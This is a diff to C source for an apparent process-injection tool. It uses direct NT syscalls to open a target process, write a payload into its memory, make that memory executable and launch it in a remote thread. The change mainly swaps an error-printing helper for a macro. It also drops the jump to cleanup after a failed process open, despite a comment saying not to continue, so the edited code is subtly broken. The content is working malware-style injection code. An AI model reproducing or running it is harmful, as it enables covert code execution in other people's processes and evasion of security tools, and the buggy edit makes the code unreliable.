@@ -1,13 +1,5 @@
 #include "injection.h"
 
-VOID PrettyFormat(
-    _In_ LPCSTR FunctionName, 
-    _In_ CONST NTSTATUS ErrorCode
-) {
-    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorCode);
-    return;
-}
-
 VOID GetSyscallNumber(
     _In_  HMODULE NtdllHandle, 
     _In_  LPCSTR NtFunctionName,
@@ -18,7 +10,7 @@ VOID GetSyscallNumber(
 
     NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
     if (0 == NtFunctionAddress) {
-        PrettyFormat("GetProcAddress", GetLastError());
+        PRINT_ERROR("GetProcAddress", GetLastError());
         return;
     }
 
@@ -47,7 +39,7 @@ BOOL DirectSyscallsInjection(
 
     NtdllHandle = GetModuleHandleW(L"NTDLL");
     if (NULL == NtdllHandle) {
-        PrettyFormat("GetModuleHandleW", GetLastError());
+        PRINT_ERROR("GetModuleHandleW", GetLastError());
         return FALSE; 
     }
     OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);
@@ -63,35 +55,35 @@ BOOL DirectSyscallsInjection(
 
     Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
     if (STATUS_SUCCESS != Status) {
-        PrettyFormat("NtOpenProcess", Status);
-        State = FALSE; goto CLEANUP;
+        PRINT_ERROR("NtOpenProcess", Status);
+        State = FALSE; /* no point in continuing if we can't even get a handle on the process */
     }
     OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);
 
     Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (STATUS_SUCCESS != Status) {
-        PrettyFormat("NtAllocateVirtualMemory", Status);
+        PRINT_ERROR("NtAllocateVirtualMemory", Status);
         State = FALSE; goto CLEANUP;
     }
     OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);
 
     Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
     if (STATUS_SUCCESS != Status) {
-        PrettyFormat("NtWriteVirtualMemory", Status);
+        PRINT_ERROR("NtWriteVirtualMemory", Status);
         State = FALSE; goto CLEANUP;
     }
     OKAY("[0x%p] [RW-] wrote %zu-bytes to buffer", Buffer, BytesWritten);
 
     Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
     if (STATUS_SUCCESS != Status) {
-        PrettyFormat("NtProtectVirtualMemory", Status);
+        PRINT_ERROR("NtProtectVirtualMemory", Status);
         State = FALSE; goto CLEANUP;
     }
     OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);
 
     Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
     if (STATUS_SUCCESS != Status) {
-        PrettyFormat("NtCreateThreadEx", Status);
+        PRINT_ERROR("NtCreateThreadEx", Status);
         State = FALSE; goto CLEANUP;
     }
 
@@ -105,7 +97,7 @@ CLEANUP:
     if (Buffer) {
         Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
         if (STATUS_SUCCESS != Status) {
-            PrettyFormat("NtFreeVirtualMemory", Status);
+            PRINT_ERROR("NtFreeVirtualMemory", Status);
         }
         else {
             INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
